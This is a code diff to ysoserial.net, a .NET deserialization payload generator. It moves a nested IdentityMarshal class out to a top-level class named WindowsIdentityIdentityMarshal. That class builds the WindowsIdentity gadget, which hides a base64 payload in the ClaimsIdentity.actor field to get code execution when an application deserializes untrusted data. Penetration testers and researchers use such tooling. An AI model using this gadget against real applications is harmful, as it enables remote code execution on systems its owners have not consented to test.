@@ -49,24 +49,7 @@ namespace ysoserial.Generators
         public override List<string> Labels()
         {
             return new List<string> { GadgetTypes.BridgeAndDerived };
-        }
-
-        [Serializable]
-        public class IdentityMarshal : ISerializable
-        {
-            public IdentityMarshal(string b64payload)
-            {
-                B64Payload = b64payload;
-            }
-
-            private string B64Payload { get; }
-
-            public void GetObjectData(SerializationInfo info, StreamingContext context)
-            {
-                info.SetType(typeof(WindowsIdentity));
-                info.AddValue("System.Security.ClaimsIdentity.actor", B64Payload);
-            }
-        }
+        }        
 
         public override object Generate(string formatter, InputArgs inputArgs)
         {
@@ -78,7 +61,7 @@ namespace ysoserial.Generators
                 || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase))
             {
-                var obj = new IdentityMarshal(b64encoded);
+                var obj = new WindowsIdentityIdentityMarshal(b64encoded);
                 return Serialize(obj, formatter, inputArgs);
             }
             else if (formatter.ToLower().Equals("json.net"))
@@ -218,6 +201,23 @@ namespace ysoserial.Generators
             {
                 throw new Exception("Formatter not supported");
             }
+        }
+    }
+
+    [Serializable]
+    public class WindowsIdentityIdentityMarshal : ISerializable
+    {
+        public WindowsIdentityIdentityMarshal(string b64payload)
+        {
+            B64Payload = b64payload;
+        }
+
+        private string B64Payload { get; }
+
+        public void GetObjectData(SerializationInfo info, StreamingContext context)
+        {
+            info.SetType(typeof(WindowsIdentity));
+            info.AddValue("System.Security.ClaimsIdentity.actor", B64Payload);
         }
     }
 }
